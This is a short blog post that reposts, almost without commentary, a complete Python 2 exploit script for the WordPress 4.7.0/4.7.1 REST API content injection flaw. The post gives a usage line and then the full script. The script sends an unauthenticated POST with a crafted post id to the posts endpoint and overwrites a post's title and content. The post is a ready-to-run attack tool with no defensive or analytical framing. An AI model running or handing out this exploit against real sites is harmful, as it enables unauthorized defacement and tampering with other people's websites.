---
layout: post
title: Wordpress Content Injection Exploit ver. 4.7.0
date: 2022-02-16 15:47
author: theguler
comments: true
categories: [Hacking - Security]
---
<!-- wp:image {"id":1816,"width":553,"height":311,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large is-resized"><img src="https://farukguler.com/assets/post_images/wordpress.jpg?w=778" alt="" class="wp-image-1816" width="553" height="311" /></figure>
<!-- /wp:image -->

<!-- wp:preformatted -->
<pre id="block-212c4770-1090-40f9-a3aa-882bb19bd474" class="wp-block-preformatted">Usage: wp-content-injection.py --url http://127.0.0.1/wordpress/index.php/wp-json/wp/v2/posts/6 --title "test_icindir" --content "dikkat! lütfen pacth gecininiz...</pre>
<!-- /wp:preformatted -->

<!-- wp:preformatted -->
<pre id="block-212c4770-1090-40f9-a3aa-882bb19bd474" class="wp-block-preformatted"># wp-content-injection.py
# Exploit Title: WP Content Injection Exploit
# Date: 02-02-2017
# Exploit Author: Rony Das
# Vendor Homepage: https://wordpress.org/
# Software Link: https://wordpress.org/download/release-archive/
# Version: Wordpress 4.7.0 &amp; 4.7.1
# Tested on: BackBox - Ubuntu Based
# Founded by: https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html
import json
import requests
import optparse
import sys
from urlparse import urlparse
import time
script = sys.argv[0]
def getPid(url):
    l = url.split('/')
    getpid = l[l.index('posts') + 1]
    return getpid

def getDomain(url):
    parsed_uri = urlparse(url)
    domain = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
    return domain

def banner():
    return """
********************************************************
* _    _______      ______ _____ _____ _____    _____  *
*| |  | | ___ \     | ___ \  _  /  ___|_   _|  |_   _| *
*| |  | | |_/ /_____| |_/ / | | \ `--.  | |______| |   *
*| |/\| |  __/______|  __/| | | |`--. \ | |______| |   *
*\  /\  / |         | |   \ \_/ /\__/ / | |     _| |_  *
* \/  \/\_|         \_|    \___/\____/  \_/     \___/  *
*                                                      *
********************************************************
Greetz:~ Dipendra,Kirit dada &lt;3, Abk Khan, Mukarram Khalid, Ahmed Raza
"""

def main():
    parser = optparse.OptionParser("Usage: "+script+" -u &lt;URL&gt; --title \"&lt;PAGE_TITLE&gt;\" --content \"&lt;PAGE_CONTENT&gt;\"")
    parser.add_option("-u", "--url", dest="URL", type="string", help="Specify the URL")
    parser.add_option("-t", "--title", dest="TITLE", type="string", help="Specify the Page Title")
    parser.add_option("-c", "--content", dest="CONTENT", type="string", help="Specify the Page Content")
    (options, args) = parser.parse_args()
    url     = options.URL
    title   = options.TITLE
    content = options.CONTENT
    data = {"id" : ""+str(getPid(url))+"textappendshere", "title" : ""+title+"", "content" : ""+content+""}
    headers = {'Content-Type': "application/json; charset=xxxe", 'Accept': "application/json"}
    res = requests.post(url, data=json.dumps(data), headers=headers)
    resp = res.status_code
    print banner()
    print "Status Code: "+str(resp)
    print time.sleep(2)
    if str(resp) == "200":
        print "Yay!"
        print "[+] Exploiting .. "
        print "[+] check the post.."
        print "[+] "+getDomain(url)+"?p="+getPid(url)
    else:
        print "May be not vulnerable?"
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print "[-] User stooped the script."
        sys.exit(0)
    except:
        pass</pre>
<!-- /wp:preformatted -->
